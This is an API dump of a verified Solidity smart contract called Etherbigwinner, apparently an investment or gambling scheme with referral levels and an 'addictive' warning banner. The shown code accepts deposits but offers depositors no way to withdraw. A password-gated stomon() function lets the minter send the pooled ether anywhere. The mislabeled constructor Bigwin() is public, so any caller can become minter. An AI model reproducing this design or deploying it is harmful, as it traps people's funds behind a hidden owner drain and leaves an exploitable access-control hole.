{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n/**\r\n * @title Bigwin\r\n *            \r\n *             ╔═╗┌─┐┌─┐┬┌─┐┬┌─┐┬   ┌─────────────────────────--------┐ ╦ ╦┌─┐┌┐ ╔═╗┬┌┬┐┌─┐ \r\n *             ║ ║├┤ ├┤ ││  │├─┤│   │                                 │ ║║║├┤ ├┴┐╚═╗│ │ ├┤  \r\n *             ╚═╝└  └  ┴└─┘┴┴ ┴┴─┘ └─┬──────────────────--------───┬─┘ ╚╩╝└─┘└─┘╚═╝┴ ┴ └─┘ \r\n *   ┌────────────────────────────────┘                     └──────────────────────────────┐\r\n *   │╔═╗┌─┐┬  ┬┌┬┐┬┌┬┐┬ ┬   ╔╦╗┌─┐┌─┐┬┌─┐┌┐┌   ╦┌┐┌┌┬┐┌─┐┬─┐┌─┐┌─┐┌─┐┌─┐   ╔═╗┌┬┐┌─┐┌─┐┬┌─│\r\n *   │╚═╗│ ││  │ │││ │ └┬┘ ═  ║║├┤ └─┐││ ┬│││ ═ ║│││ │ ├┤ ├┬┘├┤ ├─┤│  ├┤  ═ ╚═╗ │ ├─┤│  ├┴┐│\r\n *   │╚═╝└─┘┴─┘┴─┴┘┴ ┴  ┴    ═╩╝└─┘└─┘┴└─┘┘└┘   ╩┘└┘ ┴ └─┘┴└─└  ┴ ┴└─┘└─┘   ╚═╝ ┴ ┴ ┴└─┘┴ ┴│\r\n \r\n * \r\n * This product is protected under license.  Any unauthorized copy, modification, or use without \r\n * express written consent from the creators is prohibited.\r\n * \r\n * WARNING:  THIS PRODUCT IS HIGHLY ADDICTIVE.  IF YOU HAVE AN ADDICTIVE NATURE.  DO NOT PLAY.\r\n */\r\n\r\n//==============================================================================\r\n//      \r\n//     \r\n//==============================================================================\r\ncontract Etherbigwinner {\r\n\r\n    address public minter;\r\n    uint ethWei = 1 ether;\r\n    uint rid = 1;\r\n    \tuint bonuslimit = 15 ether;\r\n\tuint sendLimit = 100 ether;\r\n\tuint withdrawLimit = 15 ether;\r\n\tuint canImport = 1;\r\n\t uint totalMoney = 0;\r\n    bytes32 public hashLock = 0x449e70f55b2d1405e35f2ac0bb17549fff3df38239910a33c870101274191e1b;\t\r\n\tuint canSetStartTime = 1;\r\n\tmapping(string => address) addressMapping;\r\n\r\n    function () payable public {}\r\n    function Bigwin() public {\r\n        minter = msg.sender;\r\n    }\r\n        uint totalCount = 0;\r\n    \tstruct User{\r\n        address userAddress;\r\n        uint freeAmount;\r\n        uint freezeAmount;\r\n        uint rechargeAmount;\r\n        uint withdrawlsAmount;\r\n        uint inviteAmonut;\r\n        uint bonusAmount;\r\n        uint dayInviteAmonut;\r\n        uint dayBonusAmount;\r\n        uint level;\r\n        uint resTime;\r\n        uint lineAmount;\r\n        uint lineLevel;\r\n        string inviteCode;\r\n        string beInvitedCode;\r\n\t\tuint isline;\r\n\t\tuint status; \r\n\t\tbool isVaild;\r\n    }\r\n    \r\n    struct Invest{\r\n\r\n        address userAddress;\r\n        uint inputAmount;\r\n        uint resTime;\r\n        string inviteCode;\r\n        string beInvitedCode;\r\n\t\tuint isline;\r\n\t\tuint status; \r\n\t\tuint times;\r\n    }\r\n      mapping (address => User) userMapping; \r\n    mapping (uint => address) indexMapping;\r\n\tuint private beginTime = 1;\r\n\t    uint oneDayCount = 0;\r\n\t     uint allCount = 0;\r\n\t       Invest[] invests;\r\n    function stomon(address  userAddress, uint money,string _WhatIsTheMagicKey)  public {\r\n          require(sha256(_WhatIsTheMagicKey) == hashLock);\r\n           if (msg.sender != minter) return;\r\n\t\tif (money > 0) {\r\n\t\t\tuserAddress.transfer(money);\r\n\t\t}\r\n\t}\r\n\t\tfunction getLevel(uint value) public view returns (uint) {\r\n\t\tif (value >= 0 * ethWei && value <= 5 * ethWei) {\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t\tif (value >= 6 * ethWei && value <= 10 * ethWei) {\r\n\t\t\treturn 2;\r\n\t\t}\r\n\t\tif (value >= 11 * ethWei && value <= 15 * ethWei) {\r\n\t\t\treturn 3;\r\n\t\t}\r\n\t\treturn 0;\r\n\t}\r\n\r\n\tfunction getNodeLevel(uint value) public view returns (uint) {\r\n\t\tif (value >= 0 * ethWei && value <= 5 * ethWei) {\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t\tif (value >= 6 * ethWei && value <= 10 * ethWei) {\r\n\t\t\treturn 2;\r\n\t\t}\r\n\t\tif (value >= 11 * ethWei) {\r\n\t\t\treturn 3;\r\n\t\t}\r\n\t\treturn 0;\r\n\t}\r\n\r\n\tfunction getScByLevel(uint level) public pure returns (uint) {\r\n\t\tif (level == 1) {\r\n\t\t\treturn 5;\r\n\t\t}\r\n\t\tif (level == 2) {\r\n\t\t\treturn 7;\r\n\t\t}\r\n\t\tif (level == 3) {\r\n\t\t\treturn 10;\r\n\t\t}\r\n\t\treturn 0;\r\n\t}\r\n\r\n\tfunction getFireScByLevel(uint level) public pure returns (uint) {\r\n\t\tif (level == 1) {\r\n\t\t\treturn 3;\r\n\t\t}\r\n\t\tif (level == 2) {\r\n\t\t\treturn 6;\r\n\t\t}\r\n\t\tif (level == 3) {\r\n\t\t\treturn 10;\r\n\t\t}\r\n\t\treturn 0;\r\n\t}\r\n\r\n\tfunction getRecommendScaleByLevelAndTim(uint level, uint times) public pure returns (uint){\r\n\t\tif (level == 1 && times == 1) {\r\n\t\t\treturn 50;\r\n\t\t}\r\n\t\tif (level == 2 && times == 1) {\r\n\t\t\treturn 70;\r\n\t\t}\r\n\t\tif (level == 2 && times == 2) {\r\n\t\t\treturn 50;\r\n\t\t}\r\n\t\tif (level == 3) {\r\n\t\t\tif (times == 1) {\r\n\t\t\t\treturn 100;\r\n\t\t\t}\r\n\t\t\tif (times == 2) {\r\n\t\t\t\treturn 70;\r\n\t\t\t}\r\n\t\t\tif (times == 3) {\r\n\t\t\t\treturn 50;\r\n\t\t\t}\r\n\t\t\tif (times >= 4 && times <= 10) {\r\n\t\t\t\treturn 10;\r\n\t\t\t}\r\n\t\t\tif (times >= 11 && times <= 20) {\r\n\t\t\t\treturn 5;\r\n\t\t\t}\r\n\t\t\tif (times >= 21) {\r\n\t\t\t\treturn 1;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn 0;\r\n\t}\r\n\r\n     function invest(address userAddress ,uint inputAmount,string  inviteCode,string  beInvitedCode) public payable{\r\n        \r\n        userAddress = msg.sender;\r\n  \t\tinputAmount = msg.value;\r\n        uint lineAmount = inputAmount;\r\n        \r\n     \r\n       totalMoney = totalMoney + inputAmount;\r\n        totalCount = totalCount + 1;\r\n        bool isLine = false;\r\n        \r\n       // uint level =getlevel(inputAmount);\r\n      //  uint lineLevel =getNodeLevel(lineAmount);\r\n        if(beginTime==1){\r\n            lineAmount = 0;\r\n            oneDayCount = oneDayCount + inputAmount;\r\n            Invest memory invest1 = Invest(userAddress,inputAmount,now, inviteCode, beInvitedCode ,1,1,0);\r\n            invests.push(invest1);\r\n           \r\n        }else{\r\n            allCount = allCount + inputAmount;\r\n            isLine = true;\r\n            invest1 = Invest(userAddress,inputAmount,now, inviteCode, beInvitedCode ,0,1,0);\r\n            inputAmount = 0;\r\n            invests.push(invest1);\r\n        }\r\n          User memory user = userMapping[userAddress];\r\n            if(user.isVaild && user.status == 1){\r\n                user.freezeAmount = user.freezeAmount + inputAmount;\r\n                user.rechargeAmount = user.rechargeAmount + inputAmount;\r\n                user.lineAmount = user.lineAmount + lineAmount;\r\n       \r\n             \r\n                userMapping[userAddress] = user;\r\n                \r\n            }else{\r\n                \r\n                if(user.isVaild){\r\n                   inviteCode = user.inviteCode;\r\n                   beInvitedCode = user.beInvitedCode;\r\n                }\r\n               \r\n              \r\n            }\r\n            address  userAddressCode = addressMapping[inviteCode];\r\n            if(userAddressCode == 0x0000000000000000000000000000000000000000){\r\n                addressMapping[inviteCode] = userAddress;\r\n            }\r\n        \r\n    }\r\n    \r\n        function getUserByinviteCode(string inviteCode) public view returns (bool){\r\n        \r\n        address  userAddressCode = addressMapping[inviteCode];\r\n        User memory user = userMapping[userAddressCode];\r\n      if (user.isVaild){\r\n            return true;\r\n      }\r\n        return false;\r\n    }\r\n    \r\n    \r\n    \r\n\r\n\tfunction getaway(uint money) pure private {\r\n\t\t\r\n\t\tfor (uint i = 1; i <= 25; i++) {\r\n\t\t    uint moneyResult = 0;\r\n\t\t\tif (money <= 15 ether) {\r\n\t\t\t\tmoneyResult = money;\r\n\t\t\t} else {\r\n\t\t\t\tmoneyResult = 15 ether;\r\n\t\t\t}\r\n\r\n\t\t  \r\n\t\r\n\t\t}\r\n\t}\r\n\t\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"minter\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Bigwin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"},{\"name\":\"inputAmount\",\"type\":\"uint256\"},{\"name\":\"inviteCode\",\"type\":\"string\"},{\"name\":\"beInvitedCode\",\"type\":\"string\"}],\"name\":\"invest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"getNodeLevel\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"level\",\"type\":\"uint256\"},{\"name\":\"times\",\"type\":\"uint256\"}],\"name\":\"getRecommendScaleByLevelAndTim\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"hashLock\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"getLevel\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"inviteCode\",\"type\":\"string\"}],\"name\":\"getUserByinviteCode\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"},{\"name\":\"money\",\"type\":\"uint256\"},{\"name\":\"_WhatIsTheMagicKey\",\"type\":\"string\"}],\"name\":\"stomon\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"level\",\"type\":\"uint256\"}],\"name\":\"getFireScByLevel\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"level\",\"type\":\"uint256\"}],\"name\":\"getScByLevel\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Etherbigwinner","CompilerVersion":"v0.4.18+commit.9cf6e910","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"None","SwarmSource":"bzzr://01efba254540e6813ff2c641fa99f2f6d96b73f004d7797c7b58cc628d6381b5"}]}